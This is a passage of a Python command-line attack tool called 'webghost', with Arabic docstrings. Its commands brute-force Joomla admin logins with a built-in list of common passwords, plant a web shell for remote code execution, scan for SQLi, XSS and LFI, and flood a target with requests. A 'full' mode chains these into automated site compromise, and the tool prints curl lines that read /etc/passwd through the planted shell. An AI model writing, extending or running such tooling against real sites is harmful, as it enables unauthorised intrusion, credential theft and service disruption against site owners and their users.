        webghost brute https://target.com -u admin -w passwords.txt
        webghost brute https://target.com -u users.txt -w passwords.txt
    """
    async def _brute():
        print_banner()
        
        # Parse usernames
        usernames = [username]
        if Path(username).exists():
            with open(username) as f:
                usernames = [l.strip() for l in f if l.strip()]
        
        # Parse passwords
        passwords = []
        if password:
            passwords = [password]
        elif wordlist:
            if Path(wordlist).exists():
                with open(wordlist) as f:
                    passwords = [l.strip() for l in f if l.strip()]
            else:
                console.print(f"[red]Wordlist not found: {wordlist}[/red]")
                return
        else:
            # Default common passwords
            passwords = [
                "admin", "admin123", "password", "123456", "admin1234",
                "joomla", "administrator", "root", "test", "demo",
                "abc123", "napoli", "abc2024", "Abc2023!", "Password1",
            ]
        
        if not passwords:
            console.print("[red]No passwords provided![/red]")
            return
        
        bruteforcer = JoomlaBruteForcer(target, concurrency, delay)
        results = await bruteforcer.brute_force(usernames, passwords)
        
        if results:
            console.print(f"\n[bold green]✓ CREDENTIALS FOUND:[/bold green]")
            for r in results:
                console.print(f"  Username: [cyan]{r['username']}[/cyan]")
                console.print(f"  Password: [cyan]{r['password']}[/cyan]")
                console.print()
        else:
            console.print("\n[red]No valid credentials found.[/red]")
    
    asyncio.run(_brute())


@app.command()
def rce(
    target: str = typer.Argument(..., help="Target Joomla URL"),
    username: str = typer.Option(..., "--username", "-u", help="Admin username"),
    password: str = typer.Option(..., "--password", "-p", help="Admin password"),
    method: str = typer.Option("template", "--method", "-m", help="RCE method: template, jumi"),
):
    """
    الحصول على Remote Code Execution عبر لوحة تحكم Joomla.
    
    مثال:
        webghost rce https://target.com -u admin -p admin123
    """
    async def _rce():
        print_banner()
        
        exploiter = JoomlaRCEExploiter(target, username, password)
        
        if method == "template":
            result = await exploiter.get_rce_via_template()
        elif method == "jumi":
            result = await exploiter.get_rce_via_jumi()
        else:
            console.print(f"[red]Unknown method: {method}[/red]")
            return
        
        if result.get("success"):
            console.print(f"\n[bold green]✓ EXPLOITATION SUCCESSFUL[/bold green]")
            if result.get("shell_url"):
                console.print(f"\n[bold]Shell URL:[/bold]")
                console.print(f"  {result['shell_url']}", style="cyan")
                console.print(f"\n[bold]Usage:[/bold]")
                console.print(f"  curl '{result['shell_url'].replace('COMMAND', 'id')}'")
                console.print(f"  curl '{result['shell_url'].replace('COMMAND', 'cat /etc/passwd')}'")
                console.print(f"  curl '{result['shell_url'].replace('COMMAND', 'uname -a')}'")
        else:
            console.print(f"\n[red]Exploitation failed: {result.get('error', 'Unknown error')}[/red]")
    
    asyncio.run(_rce())


@app.command()
def scan(
    target: str = typer.Argument(..., help="Target URL"),
):
    """
    فحص شامل للثغرات (SQLi, XSS, LFI).
    
    مثال:
        webghost scan https://target.com
    """
    async def _scan():
        print_banner()
        
        scanner = VulnerabilityScanner(target)
        findings = await scanner.full_scan()
        
        # Save findings
        output_file = f"data/findings_{urlparse(target).hostname}.json"
        Path("data").mkdir(exist_ok=True)
        with open(output_file, "w") as f:
            json.dump(findings, f, indent=2)
        
        console.print(f"\n[dim]Findings saved to: {output_file}[/dim]")
    
    asyncio.run(_scan())


@app.command()
def flood(
    target: str = typer.Argument(..., help="Target URL"),
    concurrency: int = typer.Option(100, "--concurrency", "-c", help="Concurrent connections"),
    duration: int = typer.Option(60, "--duration", "-d", help="Duration in seconds"),
):
    """
    اختبار قدرة السيرفر على التحمل (Stress Testing).
    
    مثال:
        webghost flood https://target.com -c 200 -d 120
    """
    async def _flood():
        print_banner()
        
        flooder = WebFlooder(target, concurrency, duration)
        result = await flooder.start()
    
    asyncio.run(_flood())


@app.command()
def full(
    target: str = typer.Argument(..., help="Target URL"),
    brute_force: bool = typer.Option(False, "--brute", "-b", help="Enable brute force attack"),
    username: str = typer.Option("admin", "--username", "-u", help="Username for brute force"),
    wordlist: str = typer.Option(None, "--wordlist", "-w", help="Password wordlist"),
):
    """
    هجوم كامل: كشف + فحص + استغلال.
    
    مثال:
        webghost full https://target.com -b -w passwords.txt
    """
    async def _full():
        print_banner()
        
        target = target.rstrip("/")
        
        # Step 1: Detection
        console.print("[bold]═══ STEP 1: CMS DETECTION ═══[/bold]")
        detector = CMSDetector()
        cms_info = await detector.detect(target)
        
        console.print(f"CMS: [green]{cms_info['cms']}[/green]")
        console.print(f"Admin: [cyan]{cms_info.get('admin_url', 'N/A')}[/cyan]")
        
        if cms_info.get("components"):
            console.print(f"Components: {len(cms_info['components'])} found")
        
        # Step 2: Vulnerability Scan
        console.print(f"\n[bold]═══ STEP 2: VULNERABILITY SCAN ═══[/bold]")
        scanner = VulnerabilityScanner(target)
        findings = await scanner.full_scan()
        
        # Step 3: Brute Force (if enabled)
        if brute_force:
            console.print(f"\n[bold]═══ STEP 3: BRUTE FORCE ═══[/bold]")
            
            if cms_info.get("admin_url") and cms_info["cms"] == "Joomla":
                admin_url = cms_info["admin_url"]
                
                # Prepare passwords
                passwords = []
                if wordlist and Path(wordlist).exists():
                    with open(wordlist) as f:
                        passwords = [l.strip() for l in f if l.strip()][:100]  # Limit to 100
                else:
                    passwords = ["admin", "admin123", "password", "123456", "administrator", "joomla", "abc123", "napoli"]
                
                bruteforcer = JoomlaBruteForcer(admin_url, concurrency=5, delay=1.0)
                creds = await bruteforcer.brute_force([username], passwords)
                
                # Step 4: RCE if credentials found
                if creds:
                    console.print(f"\n[bold]═══ STEP 4: REMOTE CODE EXECUTION ═══[/bold]")
                    for cred in creds[:1]:  # Try first valid credential
                        exploiter = JoomlaRCEExploiter(target, cred["username"], cred["password"])
                        rce_result = await exploiter.get_rce_via_template()
                        
                        if rce_result.get("success"):
                            console.print(f"\n[bold green]✓ FULL COMPROMISE ACHIEVED![/bold green]")
                            console.print(f"Shell: {rce_result.get('shell_url')}")
            else:
                console.print("[yellow]Brute force only supports Joomla admin panels[/yellow]")
        
        # Summary
        console.print(f"\n[bold]═══ SUMMARY ═══[/bold]")
        console.print(f"Target: {target}")
        console.print(f"CMS: {cms_info['cms']}")
        console.print(f"Vulnerabilities: {len(findings)}")
    
    asyncio.run(_full())


if __name__ == "__main__":
    app()
